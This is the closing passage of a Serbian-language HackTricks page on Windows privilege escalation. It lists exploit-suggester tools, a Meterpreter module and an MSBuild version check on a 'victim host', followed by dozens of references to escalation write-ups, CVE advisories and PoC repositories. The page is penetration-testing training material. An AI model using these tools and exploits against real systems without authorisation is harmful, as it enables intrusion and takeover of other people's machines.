[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da pokrenete:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windowsu](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola za fascikle](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windowsu – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica za lokalnu eskalaciju privilegija u Windowsu / Linuxu](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je nova crna boja (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windowsu](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windowsu](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windowsu](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windowsu za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-stringa + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Lov na Silver Fox: igra mačke i miša u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka prisutna u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alatke za testiranje simboličkih linkova – korišćenje CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih linkova u Windowsu](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Zbogom, RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasno razrešavanje modula u Windowsu](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Rešeni izazovi kontrolne liste za C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own uz Microslop: ulančavanje CLDFLT i DirectX uslova utrke u kernelu radi lokalne eskalacije privilegija u Windowsu](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: primitiv za potpuno čitanje/upisivanje u Windowsu 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnih brisanja datoteka radi eskalacije privilegija i drugi korisni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Kod eksploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windowsu 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegiranje ograničeno na resurse za Kerberos: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz SSH agenta u Windowsu 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabricirane backdoor-e (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje u fabricirane backdoor-e (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: vraćanje sopstvenim koracima do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Bezbednosno obaveštenje o eskalaciji privilegija putem pomeranja u deljenoj memoriji Windows MIDI Services-a](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
